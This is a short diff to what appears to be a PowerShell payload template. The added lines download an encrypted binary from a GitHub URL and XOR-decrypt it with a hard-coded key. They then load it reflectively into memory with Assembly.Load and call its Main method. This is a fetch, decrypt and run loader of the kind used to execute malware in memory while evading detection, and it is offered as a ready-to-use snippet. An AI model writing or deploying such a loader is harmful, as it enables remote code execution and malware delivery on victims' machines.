@@ -59,3 +59,12 @@ $xorStringValue = "{{ xorStringValue }}"
 # $bytes is a byte array of the payload
 # $xorValue is a byte array of the XOR key
 for($i=0; $i -lt $bytes.Length ; $i++) { $keyItr = $i % $xorValue.Length; $bytes[$i] = $bytes[$i] -bxor $xorValue[$keyItr] }
+
+
+# Other miscellanous parts that may be useful, e.g. downloading and loading a C# assembly to reflectively load
+# $bytes = (Invoke-WebRequest "https://github.com/js-r-api/test/raw/main/encrypted_payload.bin").Content
+$bytes = (Invoke-WebRequest "https://github.com/js-r-api/test/raw/main/encrypted_payload.bin").Content
+[byte[]] $xorValue = 109,121,32,107,101,121,32,108,111,108,122
+for($i=0; $i -lt $bytes.Length ; $i++) { $keyItr = $i % $xorValue.Length; $bytes[$i] = $bytes[$i] -bxor $xorValue[$keyItr] }
+$RAS = [System.Reflection.Assembly]::Load($bytes)
+[Namespace.Program]::Main("") # change this
